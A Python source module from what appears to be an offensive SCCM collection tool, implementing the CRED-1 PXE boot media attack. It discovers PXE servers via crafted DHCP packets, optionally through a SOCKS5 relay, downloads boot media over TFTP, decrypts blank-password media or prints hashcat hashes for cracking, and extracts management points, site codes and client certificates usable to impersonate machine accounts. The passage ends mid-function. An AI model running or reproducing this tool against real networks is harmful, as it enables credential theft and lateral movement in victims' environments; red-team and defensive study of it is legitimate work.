"""
DHCP collection for ConfigManBearPig.

Implements Misconfiguration-Manager CRED-1: PXE Boot Media Abuse.

Discovers PXE-enabled distribution points via DHCP, downloads boot media
via TFTP, decrypts media variable files, and extracts:
- Management point addresses
- Client authentication certificates
- Policy secrets (NAA credentials, task sequences, collection variables)
- Certificate issuer information (SCCM self-signed vs ADCS/PKI)

Two-phase DHCP discovery (matching PowerShell lines 3610-3887):
  Phase 1: DHCPINFORM to port 4011 (PXE proxy DHCP)
  Phase 2: DHCPDISCOVER to port 67 (standard DHCP)

Then for each PXE server found:
  1. Send DHCP REQUEST to port 4011 for boot file location (option 243)
  2. Download media variable file via TFTP
  3. Attempt decryption (blank password or hashcat hash)
  4. If decrypted: extract MP address, certificates, and request policies

SOCKS5 mode (--socks-proxy):
  When a SOCKS5 proxy is configured, broadcast discovery is replaced by
  unicast requests to known targets. UDP packets are relayed through the
  SOCKS5 UDP ASSOCIATE mechanism (like cred1py). TFTP downloads are limited
  to the first block (~512 bytes) due to SOCKS relay limitations.

References:
- PXEThief: https://github.com/MWR-CyberSec/PXEThief
- pxethiefy: https://github.com/csandker/pxethiefy
- Cred1py: https://github.com/SpecterOps/cred1py
"""

import binascii
import logging
import os
import random
import socket
import struct
import time
import xml.etree.ElementTree as ET
from typing import Any, Optional

from lib.graph import GraphStore
from lib.targets import TargetManager
from lib.tftp_client import tftp_download, tftp_reachable
from lib.sccm_crypto import (
    decrypt_media_variable_file,
    derive_blank_decryption_key,
    get_hashcat_hash,
)

logger = logging.getLogger("ConfigManBearPig")


# ------------------------------------------------------------------ #
#  Privilege Detection
# ------------------------------------------------------------------ #

def _check_udp_privileges() -> bool:
    """
    Check if we have sufficient privileges for raw UDP broadcast.

    On Linux: requires root (euid 0) or CAP_NET_RAW capability.
    Returns True if broadcast sockets should work.
    """
    # Root check (Linux/macOS)
    if hasattr(os, 'geteuid') and os.geteuid() == 0:
        return True

    # Try the actual operation — some systems grant CAP_NET_RAW to non-root
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        test_sock.sendto(b'\x00', ('255.255.255.255', 0))
        test_sock.close()
        return True
    except (PermissionError, OSError):
        pass

    return False


# ------------------------------------------------------------------ #
#  Public entry point
# ------------------------------------------------------------------ #

def invoke_dhcp_collection(
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    socks_proxy: Optional[str] = None,
) -> None:
    """
    Run DHCP collection phase.

    Discovers PXE-enabled distribution points and DHCP servers, then
    attempts to download and decrypt PXE boot media (CRED-1).

    Args:
        graph: Graph store for node/edge creation
        target_manager: Target manager for device tracking
        domain: Domain name
        socks_proxy: Optional SOCKS5 proxy in "host:port" format
    """
    logger.info("Starting DHCP collection...")

    # Parse SOCKS proxy configuration
    socks_host, socks_port = None, None
    if socks_proxy:
        try:
            parts = socks_proxy.rsplit(":", 1)
            socks_host = parts[0]
            socks_port = int(parts[1])
            logger.info(f"[DHCP] SOCKS5 proxy configured: {socks_host}:{socks_port}")
            logger.info(
                "[DHCP] Broadcast discovery disabled — using unicast to known targets"
            )
        except (IndexError, ValueError):
            logger.error(f"[DHCP] Invalid --socks-proxy format: '{socks_proxy}' (expected host:port)")
            return

    # Detect proxychains without --socks-proxy
    if not socks_proxy and (os.environ.get("LD_PRELOAD") or os.environ.get("PROXYCHAINS_CONF_FILE")):
        logger.warning(
            "[DHCP] Proxychains detected but --socks-proxy not set. "
            "Proxychains cannot relay UDP (DHCP/TFTP). "
            "Use --socks-proxy HOST:PORT for DHCP collection through a tunnel."
        )
        logger.warning("[DHCP] Attempting direct broadcast (will likely fail)...")

    # Privilege check for broadcast mode
    if not socks_proxy:
        has_privs = _check_udp_privileges()
        if not has_privs:
            logger.error(
                "[DHCP] Insufficient privileges for UDP broadcast. "
                "DHCP collection requires root/sudo or CAP_NET_RAW. "
                "Run with: sudo uv run python configmanbearpig.py ..."
            )
            return

    try:
        mac = _get_local_mac()
        mac_str = ":".join(f"{b:02x}" for b in mac)
        logger.info(f"[DHCP] Using MAC address: {mac_str}")

        if socks_host and socks_port:
            _run_socks5_mode(graph, target_manager, mac, domain, socks_host, socks_port)
        else:
            _run_broadcast_mode(graph, target_manager, mac, domain)

        logger.info("[DHCP] DHCP collection completed")

    except PermissionError as e:
        logger.error(
            f"[DHCP] Permission denied: {e}. "
            f"Run with sudo or use --socks-proxy for tunneled operation."
        )
    except OSError as e:
        logger.error(f"[DHCP] Network error: {e}")
    except Exception as e:
        logger.error(f"[DHCP] Collection failed: {e}")


def _run_broadcast_mode(
    graph: GraphStore,
    target_manager: TargetManager,
    mac: bytes,
    domain: str,
) -> None:
    """Standard broadcast DHCP discovery (requires root/sudo)."""
    # Phase 1: PXE Proxy DHCP (port 4011)
    phase1_count = _run_pxe_proxy_phase(graph, target_manager, mac, domain)

    if phase1_count == 0:
        logger.info("[DHCP] No PXE (proxy DHCP) responses — Phase 2 skipped per PS behavior")
        return

    # Phase 2: Standard DHCP (port 67)
    _run_dhcp_discover_phase(graph, target_manager, mac, domain)


def _run_socks5_mode(
    graph: GraphStore,
    target_manager: TargetManager,
    mac: bytes,
    domain: str,
    socks_host: str,
    socks_port: int,
) -> None:
    """
    SOCKS5 unicast mode — sends PXE requests to known targets via SOCKS relay.

    This mirrors what cred1py does: instead of broadcast discovery, it sends
    unicast DHCPINFORM/REQUEST to specific target IPs through a SOCKS5 proxy.
    """
    from lib.socks5_udp import SOCKS5UDPRelay, SOCKS5Error

    # Collect target IPs from the target manager
    target_ips = set()
    for t in target_manager.targets.values():
        if t.ip:
            target_ips.add(t.ip)
        if t.hostname:
            try:
                addr_info = socket.getaddrinfo(t.hostname, None, socket.AF_INET)
                if addr_info:
                    target_ips.add(addr_info[0][4][0])
            except (socket.gaierror, OSError):
                pass

    if not target_ips:
        logger.warning(
            "[DHCP/SOCKS5] No target IPs available for unicast PXE requests. "
            "Run LDAP/DNS collection first, or specify targets with -c/--computers."
        )
        return

    logger.info(f"[DHCP/SOCKS5] Sending unicast PXE requests to {len(target_ips)} target(s)")

    pxe_servers_found = 0

    for target_ip in sorted(target_ips):
        logger.info(f"[DHCP/SOCKS5] Probing {target_ip}:4011 for PXE proxy...")

        try:
            relay = SOCKS5UDPRelay(socks_host, socks_port)
            relay.connect()
        except SOCKS5Error as e:
            logger.error(f"[DHCP/SOCKS5] Failed to connect to SOCKS proxy: {e}")
            return
        except Exception as e:
            logger.error(f"[DHCP/SOCKS5] Proxy connection error: {e}")
            return

        try:
            # Send DHCPINFORM to this target's port 4011
            packet = _build_dhcp_inform_packet(mac)
            logger.info(
                f"[DHCP/SOCKS5] Sending DHCPINFORM ({len(packet)} bytes) -> {target_ip}:4011"
            )
            relay.sendto(packet, target_ip, 4011)

            # Wait for response
            result = relay.recvfrom(bufsize=4096, timeout=5.0)
            if result is None:
                logger.info(f"[DHCP/SOCKS5] No PXE response from {target_ip}:4011 (timeout)")
                relay.close()
                continue

            data, sender_ip, sender_port = result
            logger.info(
                f"[DHCP/SOCKS5] Received response ({len(data)} bytes) "
                f"from {sender_ip}:{sender_port}"
            )

            parsed = _parse_dhcp_response(data)
            if parsed is None:
                logger.debug(f"[DHCP/SOCKS5] Could not parse response from {target_ip}")
                relay.close()
                continue

            _log_parsed_response(parsed, sender_ip)

            if _is_pxe_response(parsed):
                pxe_servers_found += 1
                boot_value = parsed.get("boot_file", "")
                if parsed.get("boot_file_option"):
                    boot_value = parsed["boot_file_option"]

                hint_ip = _get_server_hint(parsed, sender_ip)
                name = _resolve_ip_to_hostname(hint_ip)

                logger.info(f"[DHCP/SOCKS5] PXE server found: {name} ({hint_ip})")

                target = target_manager.add_device(name, source="DHCP-PXE")
                if target and target.sid:
                    graph.upsert_node(
                        target.sid,
                        ["Computer", "Base"],
                        properties={
                            "collectionSource": ["DHCP-PXE"],
                            "name": target.ad_object.get("sAMAccountName", "") if target.ad_object else name,
                            "networkBootServer": True,
                            "isPXEServer": True,
                            "pxeVendorClass": parsed.get("vendor_class"),
                            "pxeNextServer": parsed["siaddr"],
                            "pxeBootFile": boot_value,
                        },
                        ad_object=target.ad_object,
                    )

                # CRED-1: Request boot file location and download media via SOCKS
                relay.close()
                _attempt_pxe_media_download_socks5(
                    target_ip, mac, graph, target_manager, domain,
                    socks_host, socks_port,
                )
                continue  # relay already closed

            relay.close()

        except SOCKS5Error as e:
            logger.warning(f"[DHCP/SOCKS5] SOCKS error for {target_ip}: {e}")
            relay.close()
        except Exception as e:
            logger.warning(f"[DHCP/SOCKS5] Error probing {target_ip}: {e}")
            relay.close()

    if pxe_servers_found == 0:
        logger.info("[DHCP/SOCKS5] No PXE servers found among known targets")
    else:
        logger.info(f"[DHCP/SOCKS5] Found {pxe_servers_found} PXE server(s)")


# ------------------------------------------------------------------ #
#  MAC Address Detection
# ------------------------------------------------------------------ #

def _get_local_mac() -> bytes:
    """
    Get MAC address of first active non-loopback network interface.

    On Linux: reads from /sys/class/net/<iface>/address
    Fallback: returns 6 zero bytes
    """
    net_dir = "/sys/class/net"
    if os.path.isdir(net_dir):
        try:
            for iface in sorted(os.listdir(net_dir)):
                if iface == "lo":
                    continue
                operstate_path = os.path.join(net_dir, iface, "operstate")
                addr_path = os.path.join(net_dir, iface, "address")
                try:
                    with open(operstate_path) as f:
                        if f.read().strip() != "up":
                            continue
                except (IOError, OSError):
                    continue
                try:
                    with open(addr_path) as f:
                        mac_str = f.read().strip()
                        if mac_str and mac_str != "00:00:00:00:00:00":
                            parts = mac_str.split(":")
                            if len(parts) == 6:
                                return bytes(int(p, 16) for p in parts)
                except (IOError, OSError, ValueError):
                    continue
        except OSError:
            pass

    logger.warning("[DHCP] Could not detect MAC address, using zeros")
    return b"\x00" * 6


# ------------------------------------------------------------------ #
#  DHCP Packet Construction
# ------------------------------------------------------------------ #

def _build_bootp_header(mac: bytes, xid: bytes) -> bytes:
    """
    Build a 236-byte BOOTP header.

    Fields: op(1), htype(1), hlen(6), hops(0), xid(4), secs(0),
            flags(broadcast), ciaddr/yiaddr/siaddr/giaddr(zeros),
            chaddr(16), sname(64), file(128)
    """
    header = bytearray(236)
    header[0] = 0x01   # op: BOOTREQUEST
    header[1] = 0x01   # htype: Ethernet
    header[2] = 0x06   # hlen: 6
    header[3] = 0x00   # hops
    header[4:8] = xid  # transaction ID
    # secs = 0 (bytes 8-9)
    header[10] = 0x80  # flags: broadcast (bit 15)
    header[11] = 0x00
    # ciaddr, yiaddr, siaddr, giaddr = 0.0.0.0 (bytes 12-27)
    header[28:28 + len(mac)] = mac  # chaddr (MAC + padding)
    # sname (bytes 44-107) and file (bytes 108-235) remain zero
    return bytes(header)


def _build_dhcp_inform_packet(mac: bytes) -> bytes:
    """
    Build a DHCPINFORM packet for PXE proxy discovery (port 4011).

    Options: 53=INFORM(8), 60="PXEClient", 55=[60,66,67], 255=end
    """
    xid = random.randbytes(4)
    header = _build_bootp_header(mac, xid)

    # Magic cookie
    options = bytearray(b'\x63\x82\x53\x63')

    # Option 53: DHCP Message Type = INFORM (8)
    options.extend(b'\x35\x01\x08')

    # Option 60: Vendor Class Identifier = "PXEClient"
    vendor = b'PXEClient'
    options.extend(bytes([60, len(vendor)]) + vendor)

    # Option 55: Parameter Request List = [60, 66, 67]
    options.extend(b'\x37\x03\x3c\x42\x43')

    # Option 255: End
    options.append(0xFF)

    return header + bytes(options)


def _build_dhcp_discover_packet(mac: bytes) -> bytes:
    """
    Build a DHCPDISCOVER packet for standard DHCP discovery (port 67).

    Options: 53=DISCOVER(1), 55=[1,3,6,15,60,66,67], 60="PXEClient", 255=end
    """
    xid = random.randbytes(4)
    header = _build_bootp_header(mac, xid)

    # Magic cookie
    options = bytearray(b'\x63\x82\x53\x63')

    # Option 53: DHCP Message Type = DISCOVER (1)
    options.extend(b'\x35\x01\x01')

    # Option 55: Parameter Request List = [1,3,6,15,60,66,67]
    options.extend(bytes([55, 7, 1, 3, 6, 15, 60, 66, 67]))

    # Option 60: Vendor Class Identifier = "PXEClient"
    vendor = b'PXEClient'
    options.extend(bytes([60, len(vendor)]) + vendor)

    # Option 255: End
    options.append(0xFF)

    return header + bytes(options)


def _build_pxe_request_packet(mac: bytes, client_ip: str, server_ip: str) -> bytes:
    """
    Build a DHCP REQUEST packet for PXE boot file location (port 4011).

    This packet requests the boot media location from a specific PXE server.
    The response contains DHCP option 243 (variable file location) and
    option 252 (BCD file location).

    Options: 53=REQUEST(3), 60="PXEClient", 93=x86 arch, 250=vendor private,
             97=machine identifier, 55=request list, 255=end
    """
    xid = random.randbytes(4)

    # Build BOOTP header with client IP filled in
    header = bytearray(236)
    header[0] = 0x01   # op: BOOTREQUEST
    header[1] = 0x01   # htype
    header[2] = 0x06   # hlen
    header[3] = 0x00   # hops
    header[4:8] = xid
    header[10] = 0x80  # broadcast flag
    # ciaddr = client's IP
    header[12:16] = socket.inet_aton(client_ip)
    header[28:28 + len(mac)] = mac

    # Magic cookie
    options = bytearray(b'\x63\x82\x53\x63')

    # Option 53: DHCP Message Type = REQUEST (3)
    options.extend(b'\x35\x01\x03')

    # Option 55: Parameter Request List
    options.extend(bytes([55, 11, 3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]))

    # Option 93: PXE Client Architecture = x86 (0x0000)
    options.extend(b'\x5d\x02\x00\x00')

    # Option 250: Vendor-specific (x64 private option from pxethiefy)
    vendor_data = binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")
    options.extend(bytes([250, len(vendor_data)]) + vendor_data)

    # Option 60: Vendor Class Identifier = "PXEClient"
    vendor = b'PXEClient'
    options.extend(bytes([60, len(vendor)]) + vendor)

    # Option 97: PXE Client Machine Identifier (random)
    machine_id = b'\x00' + random.randbytes(16)
    options.extend(bytes([97, len(machine_id)]) + machine_id)

    # Option 255: End
    options.append(0xFF)

    return bytes(header) + bytes(options)


# ------------------------------------------------------------------ #
#  DHCP Response Parsing
# ------------------------------------------------------------------ #

def _parse_dhcp_response(data: bytes) -> Optional[dict]:
    """
    Parse a DHCP response packet.

    Returns dict with: siaddr, boot_file, vendor_class, tftp_server,
                       boot_file_option, options_raw
    """
    if len(data) < 240:
        return None

    # Validate magic cookie at bytes 236-239
    if data[236:240] != b'\x63\x82\x53\x63':
        return None

    # Extract siaddr (bytes 20-23)
    siaddr = socket.inet_ntoa(data[20:24])

    # Extract boot file (bytes 108-235, null-trimmed)
    boot_file = data[108:236].split(b'\x00')[0].decode('ascii', errors='ignore')

    # Parse DHCP options (TLV starting at byte 240)
    vendor_class = None
    tftp_server = None
    boot_file_option = None
    option_243 = None
    option_252 = None
    options_raw: dict[int, bytes] = {}

    idx = 240
    while idx < len(data):
        code = data[idx]
        idx += 1
        if code == 255:
            break
        if code == 0:
            continue
        if idx >= len(data):
            break
        length = data[idx]
        idx += 1
        if idx + length > len(data):
            break
        value = data[idx:idx + length]
        idx += length
        options_raw[code] = value

        if code == 60:
            vendor_class = value.decode('ascii', errors='ignore')
        elif code == 66:
            tftp_server = _convert_opt66_to_host(value)
        elif code == 67:
            boot_file_option = value.decode('ascii', errors='ignore')
        elif code == 243:
            option_243 = value
        elif code == 252:
            option_252 = value.rstrip(b'\x00').decode('ascii', errors='ignore')

    return {
        "siaddr": siaddr,
        "boot_file": boot_file,
        "vendor_class": vendor_class,
        "tftp_server": tftp_server,
        "boot_file_option": boot_file_option,
        "option_243": option_243,
        "option_252": option_252,
        "options_raw": options_raw,
    }


def _log_parsed_response(parsed: dict, sender_ip: str) -> None:
    """Log detailed parsed DHCP response fields."""
    logger.info(f"[DHCP]   Parsed response from {sender_ip}:")
    logger.info(f"[DHCP]     siaddr (next-server): {parsed['siaddr']}")
    if parsed.get("boot_file"):
        logger.info(f"[DHCP]     Boot file (BOOTP):    {parsed['boot_file']}")
    if parsed.get("vendor_class"):
        logger.info(f"[DHCP]     Vendor class (opt 60): {parsed['vendor_class']}")
    if parsed.get("tftp_server"):
        logger.info(f"[DHCP]     TFTP server (opt 66):  {parsed['tftp_server']}")
    if parsed.get("boot_file_option"):
        logger.info(f"[DHCP]     Boot file (opt 67):    {parsed['boot_file_option']}")
    if parsed.get("option_243"):
        logger.info(f"[DHCP]     PXE media (opt 243):   {parsed['option_243'].hex()}")
    if parsed.get("option_252"):
        logger.info(f"[DHCP]     BCD file (opt 252):    {parsed['option_252']}")
    opt_codes = sorted(parsed.get("options_raw", {}).keys())
    if opt_codes:
        logger.debug(f"[DHCP]     All option codes:      {opt_codes}")


def _convert_opt66_to_host(val: bytes) -> Optional[str]:
    """
    Parse DHCP option 66 (TFTP Server Name).

    Can be either a 4-byte IPv4 address or an ASCII hostname.
    """
    if not val:
        return None
    if len(val) == 4:
        try:
            return socket.inet_ntoa(val)
        except Exception:
            pass
    try:
        return val.decode('ascii', errors='ignore').rstrip('\x00')
    except Exception:
        return None


def _is_pxe_response(parsed: dict) -> bool:
    """Check if a DHCP response indicates PXE boot capability."""
    vendor = parsed.get("vendor_class") or ""
    if "PXEClient" in vendor:
        return True
    if parsed.get("boot_file"):
        return True
    if parsed.get("boot_file_option"):
        return True
    return False


def _get_server_hint(parsed: dict, sender_ip: str) -> str:
    """Get the best server IP/hostname from a parsed DHCP response."""
    if parsed.get("tftp_server"):
        return parsed["tftp_server"]
    siaddr = parsed.get("siaddr", "0.0.0.0")
    if siaddr and siaddr != "0.0.0.0":
        return siaddr
    return sender_ip


def _resolve_ip_to_hostname(ip: str) -> str:
    """Resolve an IP to hostname via reverse DNS, falling back to the IP."""
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except (socket.herror, socket.gaierror, OSError):
        return ip


# ------------------------------------------------------------------ #
#  PXE Boot Media Extraction (CRED-1)
# ------------------------------------------------------------------ #

def _extract_boot_files_from_option243(option_243: bytes) -> tuple[Optional[str], Optional[bytes]]:
    """
    Parse DHCP option 243 to extract variable file path and optional encrypted key.

    Format:
      packet_type=1: [1][len][filename_bytes]
      packet_type=2: [2][len][encrypted_key_bytes][1][str_len][filename_bytes]

    Returns:
        (variables_file_path, encrypted_key_or_None)
    """
    if not option_243 or len(option_243) < 3:
        return (None, None)

    packet_type = option_243[0]
    data_length = option_243[1]

    if packet_type == 1:
        # Direct file path
        var_file = option_243[2:2 + data_length].decode('utf-8', errors='ignore')
        logger.info(f"[DHCP]   Option 243 type=1: direct path '{var_file}'")
        return (var_file, None)

    elif packet_type == 2:
        # Encrypted key + file path
        encrypted_key = option_243[2:2 + data_length]
        str_length_idx = 2 + data_length + 1
        str_start_idx = 2 + data_length + 2
        if str_length_idx >= len(option_243):
            logger.info(f"[DHCP]   Option 243 type=2: encrypted key ({len(encrypted_key)} bytes), no file path")
            return (None, encrypted_key)
        str_length = option_243[str_length_idx]
        var_file = option_243[str_start_idx:str_start_idx + str_length].decode('utf-8', errors='ignore')
        logger.info(
            f"[DHCP]   Option 243 type=2: encrypted key ({len(encrypted_key)} bytes), "
            f"path '{var_file}' (blank password media)"
        )
        return (var_file, encrypted_key)

    logger.debug(f"[DHCP]   Option 243 unknown type: {packet_type}")
    return (None, None)


def _process_pxe_media(
    tftp_server: str,
    variables_file: str,
    encrypted_key: Optional[bytes],
    bcd_file: Optional[str],
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> None:
    """
    Download and process PXE boot media from a TFTP server.

    This implements the full CRED-1 attack chain:
    1. Download media variable file via TFTP
    2. Attempt decryption (blank password or output hashcat hash)
    3. If decrypted: extract MP address, certs, site code
    4. Create graph nodes and edges
    """
    logger.info(f"[CRED-1] Downloading PXE media via TFTP from {tftp_server}")
    logger.info(f"[CRED-1]   Variables file: {variables_file}")
    if bcd_file:
        logger.info(f"[CRED-1]   BCD file: {bcd_file}")

    # Download media variable file
    media_data = tftp_download(tftp_server, variables_file)
    if not media_data:
        logger.warning(f"[CRED-1] Failed to download media variable file from {tftp_server}")
        return

    logger.info(f"[CRED-1] Downloaded media variable file ({len(media_data)} bytes)")

    _process_downloaded_media(
        media_data, encrypted_key, tftp_server,
        graph, target_manager, domain,
    )


def _process_pxe_media_socks5(
    tftp_server: str,
    variables_file: str,
    encrypted_key: Optional[bytes],
    bcd_file: Optional[str],
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    socks_host: str,
    socks_port: int,
) -> None:
    """Download and process PXE boot media via SOCKS5 relay."""
    from lib.socks5_udp import SOCKS5UDPRelay, SOCKS5Error
    from lib.tftp_client import tftp_download_socks5

    logger.info(f"[CRED-1/SOCKS5] Downloading PXE media via TFTP from {tftp_server}")
    logger.info(f"[CRED-1/SOCKS5]   Variables file: {variables_file}")
    if bcd_file:
        logger.info(f"[CRED-1/SOCKS5]   BCD file: {bcd_file}")

    try:
        relay = SOCKS5UDPRelay(socks_host, socks_port)
        relay.connect()
    except SOCKS5Error as e:
        logger.error(f"[CRED-1/SOCKS5] SOCKS proxy connect failed: {e}")
        return

    try:
        media_data = tftp_download_socks5(tftp_server, variables_file, relay)
    finally:
        relay.close()

    if not media_data:
        logger.warning(f"[CRED-1/SOCKS5] Failed to download media variable file from {tftp_server}")
        return

    logger.info(f"[CRED-1/SOCKS5] Downloaded media data ({len(media_data)} bytes, first block)")

    # If the file was truncated (>= 512 bytes = full block), warn and still try
    if len(media_data) >= 512:
        logger.warning(
            f"[CRED-1/SOCKS5] File likely truncated to first TFTP block. "
            f"For full decryption, download via SMB: "
            f"\\\\{tftp_server}\\REMINST{variables_file}"
        )
        # Still extract hashcat hash from header (first 40 bytes)
        if not encrypted_key:
            hashcat_hash = get_hashcat_hash(media_data)
            logger.info(f"[CRED-1/SOCKS5] Hashcat hash from header: {hashcat_hash}")
            logger.info("  Crack with: hashcat -m 37200")
            return

    _process_downloaded_media(
        media_data, encrypted_key, tftp_server,
        graph, target_manager, domain,
    )


def _process_downloaded_media(
    media_data: bytes,
    encrypted_key: Optional[bytes],
    tftp_server: str,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> None:
    """Process downloaded PXE media data — shared by direct and SOCKS5 paths."""
    media_xml = None

    if encrypted_key:
        # Blank password: derive key from encrypted key in DHCP response
        logger.info("[CRED-1] PXE media has blank password — attempting decryption with derived key")
        decrypt_key = derive_blank_decryption_key(encrypted_key)
        if decrypt_key:
            media_xml = decrypt_media_variable_file(media_data, decrypt_key)
            if media_xml:
                logger.info("[CRED-1] Successfully decrypted PXE boot media (blank password)")
            else:
                logger.warning("[CRED-1] Decryption with derived key failed — media may use custom password")
                hashcat_hash = get_hashcat_hash(media_data)
                logger.info(f"[CRED-1] Hashcat hash: {hashcat_hash}")
        else:
            logger.warning("[CRED-1] Failed to derive blank decryption key")
    else:
        # Custom password: output hashcat hash for offline cracking
        hashcat_hash = get_hashcat_hash(media_data)
        logger.info(f"[CRED-1] PXE media is password-protected. Hashcat hash: {hashcat_hash}")
        logger.info("  Crack with: hashcat -m 37200 (ConfigMgr CryptDeriveKey module)")
        logger.info("  https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module")

    # If decrypted, extract the goodies
    if media_xml:
        _process_decrypted_media(media_xml, tftp_server, graph, target_manager, domain)


def _process_decrypted_media(
    media_xml: str,
    tftp_server: str,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> None:
    """
    Process decrypted PXE boot media XML to extract infrastructure info.

    Extracts:
    - _SMSMediaGuid: Media GUID
    - SMSTSMP: Management Point URL
    - _SMSTSSiteCode: Site code
    - _SMSTSMediaPFX: Client certificate (PFX, base64)
    - _SMSTSx64UnknownMachineGUID: Unknown machine GUID
    """
    try:
        root = ET.fromstring(media_xml.encode("utf-16-le") if not media_xml.startswith('<') else media_xml)
    except ET.ParseError:
        try:
            root = ET.fromstring(media_xml)
        except ET.ParseError as e:
            logger.warning(f"[CRED-1] Could not parse decrypted media XML: {e}")
            return

    def _find_var(name: str) -> Optional[str]:
        elem = root.find(f'.//var[@name="{name}"]')
        return elem.text if elem is not None and elem.text else None

    media_guid = _find_var("_SMSMediaGuid")
    mp_url = _find_var("SMSTSMP")
    site_code = _find_var("_SMSTSSiteCode")
    media_pfx = _find_var("_SMSTSMediaPFX")
    unknown_guid = _find_var("_SMSTSx64UnknownMachineGUID")

    logger.info(f"[CRED-1] Decrypted PXE media contents:")
    if mp_url:
        logger.info(f"[CRED-1]   Management Point: {mp_url}")
    if site_code:
        logger.info(f"[CRED-1]   Site Code: {site_code}")
    if media_guid:
        logger.info(f"[CRED-1]   Media GUID: {media_guid}")
    if unknown_guid:
        logger.info(f"[CRED-1]   Unknown Machine GUID: {unknown_guid}")

    # Add management point as target
    if mp_url:
        mp_host = mp_url.replace("http://", "").replace("https://", "").split("/")[0]
        target = target_manager.add_device(mp_host, source="DHCP-PXE-Media")
        if target and target.sid:
            graph.upsert_node(
                target.sid,
                ["Computer", "Base"],
                properties={
                    "collectionSource": ["DHCP-PXE-Media"],
                    "name": target.ad_object.get("sAMAccountName", "") if target.ad_object else mp_host,
                    "SCCMInfra": True,
                    "SCCMSiteSystemRoles": [f"SMS Management Point@{site_code}"] if site_code else ["SMS Management Point"],
                    "pxeMediaManagementPoint": mp_url,
                },
                ad_object=target.ad_object,
            )

    # Create site node
    if site_code:
        graph.upsert_node(
            site_code,
            ["SCCM_Site"],
            properties={
                "collectionSource": ["DHCP-PXE-Media"],
                "SCCMInfra": True,
                "siteCode": site_code,
            },
        )

    # Analyze certificate
    if media_pfx:
        _analyze_pxe_certificate(media_pfx, graph, target_manager, domain, site_code)


def _analyze_pxe_certificate(
    pfx_base64: str,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    site_code: Optional[str],
) -> None:
    """
    Analyze the PXE client certificate to determine if it's from ADCS or self-signed.

    If ADCS-issued (PKI), creates SCCM_ObtainCertFor edge (ELEVATE-5).
    """
    try:
        import base64
        from cryptography.hazmat.primitives.serialization import pkcs12
        from cryptography import x509

        pfx_bytes = base64.b64decode(pfx_base64)
        # PXE media PFX typically has no password or empty password
        private_key, cert, chain = pkcs12.load_key_and_certificates(pfx_bytes, None)

        if cert is None:
            logger.debug("[CRED-1] No certificate in PXE media PFX")
            return

        # Extract issuer CN
        issuer_cn = None
        for attr in cert.issuer:
            if attr.oid == x509.oid.NameOID.COMMON_NAME:
                issuer_cn = attr.value
                break

        subject_cn = None
        for attr in cert.subject:
            if attr.oid == x509.oid.NameOID.COMMON_NAME:
                subject_cn = attr.value
                break

        # Check for client auth EKU
        has_client_auth = False
        try:
            eku = cert.extensions.get_extension_for_class(x509.ExtendedKeyUsage)
            for usage in eku.value:
                if usage.dotted_string == "1.3.6.1.5.5.7.3.2":  # TLS Web Client Authentication
                    has_client_auth = True
                    break
        except x509.ExtensionNotFound:
            pass

        logger.info(f"[CRED-1] PXE Certificate:")
        logger.info(f"[CRED-1]   Subject: {subject_cn}")
        logger.info(f"[CRED-1]   Issuer: {issuer_cn}")
        logger.info(f"[CRED-1]   Client Auth EKU: {has_client_auth}")

        # Determine if ADCS-issued (not self-signed and not SCCM self-signed)
        is_self_signed = (issuer_cn == subject_cn)
        is_sccm_signed = issuer_cn and ("SMS" in issuer_cn or "ConfigMgr" in issuer_cn or "SCCM" in issuer_cn)
        is_adcs = not is_self_signed and not is_sccm_signed

        if is_adcs and has_client_auth:
            logger.info(f"[CRED-1]   Certificate is ADCS-issued with Client Auth — ELEVATE-5 applicable")
            logger.info(f"[CRED-1]   Issuing CA: {issuer_cn}")

            # Create SCCM_ObtainCertFor edge from Authenticated Users to the DP
            # The certificate can be used to impersonate the DP's machine account
            if subject_cn:
                dp_target = target_manager.add_device(subject_cn, source="DHCP-PXE-Cert")
                if dp_target and dp_target.sid:
                    # Find or create Authenticated Users node
                    auth_users_sid = f"S-1-5-11"  # Well-known SID for Authenticated Users
                    graph.upsert_node(
                        auth_users_sid,
                        ["Group", "Base"],
                        properties={
                            "name": "AUTHENTICATED USERS@" + domain.upper(),
                            "objectid": auth_users_sid,
                            "domain": domain.upper(),
                        },
                    )
                    graph.upsert_edge(
                        auth_users_sid,
                        dp_target.sid,
                        "SCCM_ObtainCertFor",
                        properties={
                            "collectionSource": ["DHCP-PXE-Cert"],
                            "certificateIssuer": issuer_cn,
                            "certificateSubject": subject_cn,
                            "hasClientAuth": True,
                            "isADCS": True,
                        },
                    )
                    logger.info(f"[CRED-1]   Created SCCM_ObtainCertFor edge: Authenticated Users -> {subject_cn}")
        elif is_adcs:
            logger.info(f"[CRED-1]   Certificate is ADCS-issued but WITHOUT Client Auth EKU")
        else:
            cert_type = "self-signed" if is_self_signed else "SCCM-signed"
            logger.info(f"[CRED-1]   Certificate is {cert_type} (not PKI/ADCS)")

    except ImportError:
        logger.debug("[CRED-1] Certificate analysis requires cryptography library")
    except Exception as e:
        logger.debug(f"[CRED-1] PXE certificate analysis failed: {e}")


# ------------------------------------------------------------------ #
#  Phase 1: PXE Proxy DHCP (port 4011) — Broadcast mode
# ------------------------------------------------------------------ #

def _run_pxe_proxy_phase(
    graph: GraphStore,
    target_manager: TargetManager,
    mac: bytes,
    domain: str,
) -> int:
    """
    Phase 1: Send DHCPINFORM to broadcast:4011 and process responses.

    Returns number of responses received.
    """
    packet = _build_dhcp_inform_packet(mac)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        logger.info(f"[DHCP] Phase 1: Sending DHCPINFORM ({len(packet)} bytes) -> 255.255.255.255:4011")
        sock.sendto(packet, ('255.255.255.255', 4011))
    except PermissionError as e:
        logger.error(
            f"[DHCP] Permission denied sending broadcast: {e}. "
            f"Run with: sudo uv run python configmanbearpig.py ..."
        )
        return 0
    except Exception as e:
